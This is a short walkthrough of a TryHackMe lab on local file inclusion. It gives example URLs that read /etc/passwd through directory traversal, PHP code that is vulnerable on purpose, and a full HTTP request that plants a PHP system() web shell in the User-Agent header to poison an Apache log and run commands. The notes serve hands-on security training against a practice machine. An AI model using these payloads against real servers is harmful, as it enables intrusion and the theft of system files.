# Room
https://tryhackme.com/room/lfibasics

# Task 1 - Intro
LFI - Local File Inclusion.  LFI is a vulnerability that allows an attacker to include or read files.  It occurs when an applications uses the path to a file as input

Example
```
http://10.10.63.217/lfi/lfi.php?page=/etc/passwd
```

Vulnerable Code Example
```
$local_file = $_REQUEST["page"];
```

# Task 2 - LFI with Directory Traversal
Directory Traversal, sometimes called Path Traversal, is an HTTP attack that allows attackers to access restricted directories and execute commands

Example
```
http://10.10.63.217/lfi2/lfi.php?page=../creditcard
http://10.10.63.217/lfi2/lfi.php?page=../../../../../etc/passwd
```

Vulnerable Code Example
```
$local_file = "html/".$_REQUEST["page"];
```

# Task 3 - RCE with LFI and Log Poisoning
Log Poisoning is a technique used to gain a reverse shell from an LFI

* Log to poison
  * /var/log/apache2/access.log
* Use Burp to inercept the GET request and insert <?php system($_GET['lfi']); ?>  in the user agent, and then append &lfi=command_here to execute a command

```
GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=pwd HTTP/1.1
Host: 10.10.63.217
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 <?php system($_GET['lfi']); ?> 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

* LFI Resources
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion